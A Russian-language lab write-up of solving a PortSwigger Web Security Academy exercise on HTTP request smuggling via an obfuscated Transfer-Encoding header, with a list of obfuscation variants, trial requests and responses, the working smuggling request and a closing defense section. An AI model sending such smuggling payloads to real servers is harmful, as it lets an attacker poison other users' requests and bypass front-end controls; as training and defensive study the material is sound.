### Поведение TE.TE: обфускирование заголовка TE

Здесь интерфейсные и бэк-энд-серверы поддерживают заголовок`Transfer-Encoding`, но один из серверов может быть вызван не обрабатывать его, каким-то образом обфускируя заголовок

лаба 
https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header

```c
способы запутывания заголовка `Transfer-Encoding`. Например:

Transfer-Encoding: xchunked 

Transfer-Encoding : chunked 

Transfer-Encoding: chunked 

Transfer-Encoding: x 

Transfer-Encoding:[tab]chunked 

[space]Transfer-Encoding: chunked 

X: X[\n]Transfer-Encoding: chunked 

Transfer-Encoding : chunked
```


это ситуация когда оба сервера типа умеют transfer-encoding, но один можно обмануть

типо при обфусцировании заголовка получается что этот обуфусцированный заголовок xchunked, например6 фронт читает , а бек уже не может прочесть его и использует CL напрмиер так как выбора у него нет ...

и в в итоге получается классическая te.cl или cl.te атака

---------

решаю лабу

вот ориг запрос
```http
GET / HTTP/2
Host: 0af7000403724bc980ed7b0800a20039.web-security-academy.net
Cookie: session=VBDqK0crjjXFH2b52S6q3EZRkbj75zKf
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

меняю сразу тип на post
протокол на http/1.1
выключаю апдейт CL
и добавляю
Content-Type: application/x-www-form-urlencoded
Content-length: 1
Transfer-Encoding: chunked


-----

отправляю 
```http
POST / HTTP/1.1
Host: 0af7000403724bc980ed7b0800a20039.web-security-academy.net
Cookie: session=VBDqK0crjjXFH2b52S6q3EZRkbj75zKf
Content-Type: application/x-www-form-urlencoded
Content-length: 3
Transfer-Encoding: chunked

1
```
и ловлю ошибку  400 "error":"Read timeout"

------
а вот так - ответ 200 обычный
```http
POST / HTTP/1.1
Host: 0af7000403724bc980ed7b0800a20039.web-security-academy.net
Cookie: session=VBDqK0crjjXFH2b52S6q3EZRkbj75zKf
Content-Type: application/x-www-form-urlencoded
Content-length: 3
Transfer-Encoding: xchunked

1

```

-------

вот так ответ стандарт 200
```http
POST / HTTP/1.1
Host: 0af7000403724bc980ed7b0800a20039.web-security-academy.net
Cookie: session=VBDqK0crjjXFH2b52S6q3EZRkbj75zKf
Content-Type: application/x-www-form-urlencoded
Content-length: 6
Transfer-Encoding: xchunked

0
ggg
```
но если cl 7 - то ошибка тайм аут
это признак что один сервер ждет данных а второй нет
это уже намек на уязвимость вроде бы как

----------

вот так ответ 200 обычный
```http
POST / HTTP/1.1
Host: 0af7000403724bc980ed7b0800a20039.web-security-academy.net
Cookie: session=VBDqK0crjjXFH2b52S6q3EZRkbj75zKf
Content-Type: application/x-www-form-urlencoded
Content-length: 10
Transfer-Encoding: xchunked

0


ggg
```

-----

вот так тоже 200 обчн
```http
POST / HTTP/1.1
Host: 0af7000403724bc980ed7b0800a20039.web-security-academy.net
Cookie: session=VBDqK0crjjXFH2b52S6q3EZRkbj75zKf
Content-Type: application/x-www-form-urlencoded
Content-length: 8
Transfer-Encoding: chunked

0

ggg
```


---------


ловлю 500 ошибку  timed out
```http
POST / HTTP/1.1
Host: 0af7000403724bc980ed7b0800a20039.web-security-academy.net
Cookie: session=VBDqK0crjjXFH2b52S6q3EZRkbj75zKf
Content-Type: application/x-www-form-urlencoded
Content-length: 8
Transfer-Encoding: chunked
Transfer-Encoding: xchunked

0

ggg
```

```http
HTTP/1.1 500 Internal Server Error
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 125

<html><head><title>Server Error: Proxy error</title></head><body><h1>Server Error: Communication timed out</h1></body></html>
```

а если поменять местами вот так 
Transfer-Encoding: xchunked
Transfer-Encoding: chunked

то ответ 200

то есть сервер смотрит на первый попавшийся T.E.

------

но если так 
Transfer-Encoding: xchunked
Transfer-Encoding: xchunked

то сервер тоже 200 отвечает - значит он наверно начитает слушать C.L. ...
200 

---

и если CL сделать не 8 а больше - 10 то палает с тайм аут еррор 400
```http
Content-length: 10
Transfer-Encoding: xchunked
Transfer-Encoding: xchunked

0

ggg
```



---


тупо методом тыка нащупал!!!

```http
POST / HTTP/1.1
Host: 0af7000403724bc980ed7b0800a20039.web-security-academy.net
Cookie: session=VBDqK0crjjXFH2b52S6q3EZRkbj75zKf
Content-Type: application/x-www-form-urlencoded
Content-length:  7
Transfer-Encoding: xchunked
Transfer-Encoding: chunked

0

ggg
```
ответ
```http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 28

"Unrecognized method GGPOST"
```

это уже победа

далая финал запрос
```http
POST / HTTP/1.1
Host: 0af7000403724bc980ed7b0800a20039.web-security-academy.net
Cookie: session=VBDqK0crjjXFH2b52S6q3EZRkbj75zKf
Content-Type: application/x-www-form-urlencoded
Content-length:  6
Transfer-Encoding: xchunked
Transfer-Encoding: chunked

0

ggg
```
ответ 
```http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 27

"Unrecognized method GPOST"
```

⭐️🟣 лаба решена!!! ура

-----------
## суть

суть в том что оба сервера заявляют что понимают transfer-encoding но реализация у них разная

я подобрал такие два заголовка чтоб один сервер прочитал первый и увидел chunked, а второй сервер прочитал второй и увидел херню xchunked

в моем случае сработало

transfer-encoding: xchunked и 
transfer-encoding: chunked

фронт видит xchunked и не понимает, переключается на content-length

бэк видит chunked и парсит чанки

получается классическая te.cl

дальше я отправил запрос с 0 и тремя g, content-length подобрал так чтоб фронт отрезал ровно до букв которые потом приклеятся к следующему запросу

на втором запросе подобрал длинну CL чтобы пришло unrecognized method gpost

## защита

нужно чтобы все серверы в цепочке использовали одинаковые правила парсинга заголовков и не допускали дублирования

лучше всего переходить на http/2 где такой ерунды нет

если сидим на http/1.1 то настройте серверы так чтоб они отклоняли любые запросы с обфусцированными заголовками или с несколькими transfer-encoding

и регулярно обновляйте софт чтобы разработчики закрывали подобные дыры